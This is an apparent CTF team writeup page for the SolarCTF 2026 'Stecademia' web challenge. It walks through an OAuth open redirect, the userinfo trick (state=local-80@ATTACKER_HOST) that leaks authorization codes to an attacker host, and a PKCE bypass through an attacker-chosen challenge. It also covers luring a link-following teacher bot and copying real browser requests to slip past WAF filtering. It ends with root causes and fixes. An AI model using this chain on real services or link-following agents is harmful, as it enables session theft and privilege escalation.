@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Stecademia · SolarCTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="An open redirect in the OAuth state handling leaks the victim's authorization code. PKCE doesn't help when the attacker generated the challenge, so the stolen code redeems into a teacher session." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>stecademia</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Stecademia <span class="page-sub">OAuth open redirect, PKCE bypass</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">SOLARCTF{...}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Vuln</strong></td>
+<td>Open redirect in OAuth <code>state</code> handling → authorization code theft → PKCE bypass (attacker-controlled challenge/verifier) → privilege escalation to <code>teacher</code></td>
+</tr>
+</tbody></table>
+<h2 id="1-recon"><a class="wu-anchor" href="#1-recon" aria-hidden="true">#</a>1. Recon</h2>
+<p>The site is an online programming school. Authentication uses PKCE:</p>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">var</span> verifier = <span class="hljs-title function_">b64u</span>(crypto.<span class="hljs-title function_">getRandomValues</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">48</span>)));</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">var</span> digest = <span class="hljs-keyword">await</span> crypto.<span class="hljs-property">subtle</span>.<span class="hljs-title function_">digest</span>(<span class="hljs-string">&quot;SHA-256&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>().<span class="hljs-title function_">encode</span>(verifier));</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">...</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;/sso/auth?&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>({</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  <span class="hljs-attr">client_id</span>: <span class="hljs-string">&quot;lms-web&quot;</span>,</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">  <span class="hljs-attr">response_type</span>: <span class="hljs-string">&quot;code&quot;</span>,</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">  <span class="hljs-attr">scope</span>: <span class="hljs-string">&quot;openid profile&quot;</span>,</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">  <span class="hljs-attr">redirect_uri</span>: location.<span class="hljs-property">origin</span> + <span class="hljs-string">&quot;/login&quot;</span>,</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">  <span class="hljs-attr">state</span>: state,</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">  <span class="hljs-attr">code_challenge</span>: <span class="hljs-title function_">b64u</span>(digest),</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">  <span class="hljs-attr">code_challenge_method</span>: <span class="hljs-string">&quot;S256&quot;</span></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">});</span></span></code></pre>
+      
+    </figure><p>After login, <code>/sso/auth</code> redirects back to <code>/login?code=...&amp;state=...</code>, and the frontend exchanges the code for a token:</p>
+<figure class="wu-code" data-lines="12">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">function</span> <span class="hljs-title function_">exchange</span>(<span class="hljs-params">code, verifier</span>) {</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/sso/token&quot;</span>, {</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">    <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">      <span class="hljs-attr">grant_type</span>: <span class="hljs-string">&quot;authorization_code&quot;</span>,</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">      <span class="hljs-attr">code</span>: code,</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">      <span class="hljs-attr">code_verifier</span>: verifier,</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">      <span class="hljs-attr">client_id</span>: <span class="hljs-string">&quot;lms-web&quot;</span>,</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">      <span class="hljs-attr">redirect_uri</span>: location.<span class="hljs-property">origin</span> + <span class="hljs-string">&quot;/login&quot;</span></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">    })</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">  });</span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">}</span></span></code></pre>
+      
+    </figure><p>The flag lives behind a teacher-only endpoint:</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">if</span> (user.<span class="hljs-property">role</span> === <span class="hljs-string">&quot;teacher&quot;</span>) {</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-comment">// &quot;Open exam answer keys&quot; button</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  <span class="hljs-variable constant_">API</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/api/exam-answers&quot;</span>); <span class="hljs-comment">// -&gt; { course, note, flag }</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">}</span></span></code></pre>
+      
+    </figure><p>So the goal is to obtain a valid access token for a <code>teacher</code> account.</p>
+<h2 id="2-finding-the-open-redirect"><a class="wu-anchor" href="#2-finding-the-open-redirect" aria-hidden="true">#</a>2. Finding the Open Redirect</h2>
+<p><code>handleCallback()</code> in <code>/login</code> contains a leftover local-development path:</p>
+<figure class="wu-code" data-lines="11">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCallback</span>(<span class="hljs-params"></span>) {</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-keyword">var</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(location.<span class="hljs-property">search</span>);</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  <span class="hljs-keyword">var</span> code = p.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;code&quot;</span>);</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-keyword">var</span> st = p.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;state&quot;</span>);</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">  <span class="hljs-keyword">if</span> (st &amp;&amp; st.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;local&quot;</span>) === <span class="hljs-number">0</span>) {</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;http://localhost:&quot;</span> + st.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/login&quot;</span> + location.<span class="hljs-property">search</span>);</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">    <span class="hljs-keyword">return</span>;</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">  }</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">  ...</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">}</span></span></code></pre>
+      
+    </figure><p>If <code>state</code> starts with the literal string <code>local</code>, the page immediately redirects to <code>http://localhost:&lt;st.split(&quot;-&quot;)[1]&gt;/login</code>, carrying the <strong>entire query string - including the authorization <code>code</code></strong> - along with it. The code assumes the part after the first <code>-</code> is a port number (e.g. <code>local-3000</code>), but nothing validates that assumption.</p>
+<h3 id="the-userinfo-trick"><a class="wu-anchor" href="#the-userinfo-trick" aria-hidden="true">#</a>The userinfo trick</h3>
+<p>A URL of the form <code>scheme://user:password@host/path</code> sends the browser to <code>host</code>, treating everything before <code>@</code> as credentials. So:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">state = local-80@ATTACKER_HOST</code></pre>
+      
+    </figure><p>produces:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">http://localhost:80@ATTACKER_HOST/login?code=...&amp;state=...</code></pre>
+      
+    </figure><p>which the browser resolves to <code>ATTACKER_HOST</code>, not <code>localhost</code>. The attacker-controlled host receives the victim&#39;s authorization code.</p>
+<h3 id="a-constraint-from-the-parsing"><a class="wu-anchor" href="#a-constraint-from-the-parsing" aria-hidden="true">#</a>A constraint from the parsing</h3>
+<p><code>st.split(&quot;-&quot;)[1]</code> means the attacker-controlled hostname must not itself contain a <code>-</code>, or the split would grab only part of it. Public OAST/webhook domains with UUID-style subdomains (e.g. webhook.site) are unusable here; a plain alphanumeric domain like one from <code>app.interactsh.com</code> (<code>xxxxxxxx.oast.fun</code>) or Burp Collaborator (<code>xxxxxxxx.oastify.com</code>) works.</p>
+<h2 id="3-why-pkce-doesn39t-save-it"><a class="wu-anchor" href="#3-why-pkce-doesn39t-save-it" aria-hidden="true">#</a>3. Why PKCE Doesn&#39;t Save It</h2>
+<p>PKCE is designed so that a stolen authorization code is useless without the original <code>code_verifier</code>, which only the party that initiated the flow holds. That assumption breaks down here because <strong>the attacker is the one constructing the login link</strong> sent to the victim. The attacker:</p>
+<ol>
+<li>Generates their own <code>verifier</code> / <code>code_challenge</code> pair.</li>
+<li>Embeds their <code>code_challenge</code> in the crafted <code>/sso/auth</code> URL.</li>
+<li>Sends that URL to the victim (the teacher).</li>
+<li>The victim authenticates; the SSO server issues a code bound to the <em>attacker&#39;s</em> challenge.</li>
+<li>The open redirect leaks that code to the attacker.</li>
+<li>The attacker redeems the code with their own <code>verifier</code> - which matches, because they generated the challenge in the first place.</li>
+</ol>
+<p>PKCE protects against a passive code interceptor who <em>doesn&#39;t</em> control the challenge. It does nothing against an attacker who supplies the challenge themselves.</p>
+<h2 id="4-getting-the-victim-to-click"><a class="wu-anchor" href="#4-getting-the-victim-to-click" aria-hidden="true">#</a>4. Getting the Victim to Click</h2>
+<p>The support page lets students message a teacher; replies in testing showed the message is read by an automated agent (&quot;teacher bot&quot;) that opens links sent to it. Submitting the crafted login URL as a support question causes the bot to visit <code>/sso/auth?...</code>, authenticate as the teacher, and get redirected through the open-redirect path with its authorization code - and in this instance the bot&#39;s reply itself echoed the broken URL it tried to open, handing the code back directly.</p>
+<h2 id="5-exploitation"><a class="wu-anchor" href="#5-exploitation" aria-hidden="true">#</a>5. Exploitation</h2>
+<p><strong>Generate a PKCE pair</strong> (challenge must not start with <code>-</code> or <code>_</code> to stay URL-safe without extra encoding):</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> secrets, hashlib, base64</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">verifier = secrets.token_urlsafe(<span class="hljs-number">48</span>)</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(<span class="hljs-string">b&quot;=&quot;</span>).decode()</span></span></code></pre>
+      
+    </figure><p><strong>Get a dash-free OAST domain</strong> from <code>https://app.interactsh.com</code> (or Burp Community&#39;s built-in Collaborator client).</p>
+<p><strong>Build the malicious login link:</strong></p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">https://online-school.solarctf.ru/sso/auth?client_id=lms-web&amp;response_type=code&amp;scope=openid+profile&amp;redirect_uri=https%3A%2F%2Fonline-school.solarctf.ru%2Flogin&amp;state=local-80%40&lt;OAST_DOMAIN&gt;&amp;code_challenge=&lt;CHALLENGE&gt;&amp;code_challenge_method=S256</code></pre>
+      
+    </figure><p><strong>Send it via <code>/support</code></strong> as a question to the teacher.</p>
+<p><strong>Capture the authorization code</strong> from the OAST interaction log (or, as happened here, directly from the bot&#39;s auto-reply quoting the broken URL).</p>
+<p><strong>Exchange the code for a token:</strong></p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">http</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-http">POST /sso/token HTTP/1.1
+Host: online-school.solarctf.ru
+Content-Type: application/json
+
+{&quot;grant_type&quot;:&quot;authorization_code&quot;,&quot;code&quot;:&quot;&lt;CODE&gt;&quot;,&quot;code_verifier&quot;:&quot;&lt;VERIFIER&gt;&quot;,&quot;client_id&quot;:&quot;lms-web&quot;,&quot;redirect_uri&quot;:&quot;https://online-school.solarctf.ru/login&quot;}</code></pre>
+      
+    </figure><p>Response includes a JWT whose payload decodes to <code>&quot;role&quot;:&quot;teacher&quot;</code>.</p>
+<p><strong>Call the protected endpoint:</strong></p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">http</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-http">GET /api/exam-answers HTTP/1.1
+Host: online-school.solarctf.ru
+Authorization: Bearer &lt;ACCESS_TOKEN&gt;</code></pre>
+      
+    </figure><figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-11" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-11"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;course&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;...&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;note&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;...&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SOLARCTF{...}&quot;</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-12" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-12"><code class="language-text">SOLARCTF{...}</code></pre>
+      
+    </figure><p><em>(insert exact flag string from the response)</em></p>
+<h2 id="debugging-notes"><a class="wu-anchor" href="#debugging-notes" aria-hidden="true">#</a>Debugging Notes</h2>
+<p>Hand-typed requests in a fresh Burp Repeater tab initially timed out / got <code>403</code>&#39;d by the target. Two issues:</p>
+<ol>
+<li>A manually typed raw request needs an explicit blank line after the last header, or Burp can hang waiting for more header data.</li>
+<li>The target rejected bare, minimal requests (missing realistic <code>User-Agent</code>/<code>Accept</code>/etc., likely filtered by a WAF or bot-detection rule). The fix was to capture a <strong>real browser-issued request</strong> via Burp&#39;s Proxy history, send it to Repeater, and edit <em>that</em> request in place (swap the path to <code>/api/exam-answers</code>, add the <code>Authorization</code> header) rather than building one from scratch. Editing a request the server already accepted preserves every header/fingerprint detail it expects.</li>
+</ol>
+<h2 id="root-cause-fix"><a class="wu-anchor" href="#root-cause-fix" aria-hidden="true">#</a>Root Cause &amp; Fix</h2>
+<ol>
+<li><strong>Open redirect in the OAuth callback handler:</strong> the <code>state</code>-based &quot;local dev&quot; shortcut performs an unvalidated redirect that forwards the authorization code to an arbitrary attacker-controlled host. Dev/debug code paths should never ship to production, and redirect targets must be allow-listed, never derived from unauthenticated client-controlled input.</li>
+<li><strong>PKCE misunderstanding:</strong> PKCE defends against code interception by parties who didn&#39;t initiate the flow - it is not a substitute for <code>redirect_uri</code> validation. The authorization server must strictly validate <code>redirect_uri</code> against a registered allow-list per <code>client_id</code>.</li>
+<li><strong>No bot/user caution around untrusted links:</strong> an automated agent that visits arbitrary links submitted by any user is a built-in SSRF/credential-theft primitive. Automated agents with privileged sessions should never follow user-submitted URLs.</li>
+</ol>
+<h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
+<ul>
+<li>An &quot;unguessable&quot; security property (PKCE, random tokens) only holds if the attacker is excluded from generating/controlling the matching secret. Ask: <em>who creates this value, and could that be me?</em></li>
+<li>Grep client-side JS for <code>state.indexOf</code>, <code>split(&quot;-&quot;)</code>, <code>localhost</code>, and other leftover dev/debug branches - these frequently ship to production unreviewed.</li>
+<li>When a server rejects or hangs on a hand-built request, capture a real one from the Proxy and edit it in place instead of debugging syntax from scratch.</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#1-recon">1. Recon</a></li><li><a href="#2-finding-the-open-redirect">2. Finding the Open Redirect</a><ol class="wu-toc-sub"><li><a href="#the-userinfo-trick">The userinfo trick</a></li><li><a href="#a-constraint-from-the-parsing">A constraint from the parsing</a></li></ol></li><li><a href="#3-why-pkce-doesn39t-save-it">3. Why PKCE Doesn&#39;t Save It</a></li><li><a href="#4-getting-the-victim-to-click">4. Getting the Victim to Click</a></li><li><a href="#5-exploitation">5. Exploitation</a></li><li><a href="#flag">Flag</a></li><li><a href="#debugging-notes">Debugging Notes</a></li><li><a href="#root-cause-fix">Root Cause &amp; Fix</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="unreal-duck.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Unreal Duck</span></a>
+    <a class="wu-pager-link wu-pager-next" href="faded-trace.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Faded Trace</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
